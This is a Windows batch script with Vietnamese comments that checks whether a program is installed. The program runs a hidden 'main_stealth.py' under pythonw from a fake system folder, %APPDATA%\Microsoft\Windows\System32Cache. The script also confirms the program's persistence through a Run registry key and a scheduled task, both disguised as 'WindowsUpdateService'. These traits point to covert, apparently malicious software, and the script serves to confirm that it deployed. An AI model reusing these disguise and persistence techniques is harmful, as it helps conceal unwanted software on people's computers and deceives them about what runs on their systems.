@echo off
REM ========================================
REM TEST INSTALLATION
REM ========================================
REM Script này để test xem cài đặt có thành công không
REM ========================================

chcp 65001 >nul 2>&1
cls
echo ========================================
echo    TEST CAI DAT
echo ========================================
echo.

set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"

echo [1] Kiem tra thu muc cai dat...
if exist "%INSTALL_DIR%" (
    echo [OK] Thu muc ton tai: %INSTALL_DIR%
) else (
    echo [ERROR] Thu muc khong ton tai!
    pause
    exit /b 1
)
echo.

echo [2] Kiem tra file quan trong...
if exist "%INSTALL_DIR%\main_stealth.py" (
    echo [OK] main_stealth.py ton tai
) else (
    echo [ERROR] main_stealth.py khong ton tai!
    pause
    exit /b 1
)

if exist "%INSTALL_DIR%\config.py" (
    echo [OK] config.py ton tai
) else (
    echo [ERROR] config.py khong ton tai!
    pause
    exit /b 1
)
echo.

echo [3] Kiem tra process dang chay...
tasklist /FI "IMAGENAME eq pythonw.exe" 2>nul | find /I "pythonw.exe" >nul
if not errorlevel 1 (
    echo [OK] Tim thay pythonw.exe dang chay
    tasklist /FI "IMAGENAME eq pythonw.exe"
) else (
    tasklist /FI "IMAGENAME eq python.exe" 2>nul | find /I "python.exe" >nul
    if not errorlevel 1 (
        echo [OK] Tim thay python.exe dang chay
        tasklist /FI "IMAGENAME eq python.exe"
    ) else (
        echo [WARNING] Khong tim thay process Python dang chay
        echo Ung dung co the chua khoi dong hoac da dung.
    )
)
echo.

echo [4] Kiem tra Windows Startup...
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" >nul 2>&1
if not errorlevel 1 (
    echo [OK] Da duoc them vao Windows Startup (Registry)
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService"
) else (
    echo [WARNING] Khong tim thay trong Registry
)
echo.

schtasks /query /tn "WindowsUpdateService" >nul 2>&1
if not errorlevel 1 (
    echo [OK] Da duoc them vao Task Scheduler
) else (
    echo [WARNING] Khong tim thay trong Task Scheduler
)
echo.

echo [5] Kiem tra file log (neu co)...
if exist "%INSTALL_DIR%\temp\error.log" (
    echo [INFO] Tim thay file log loi:
    type "%INSTALL_DIR%\temp\error.log"
) else (
    echo [OK] Khong co file log loi
)
echo.

echo ========================================
echo    KET QUA TEST
echo ========================================
echo.
echo Neu tat ca deu [OK], ung dung da duoc cai dat thanh cong!
echo.
pause

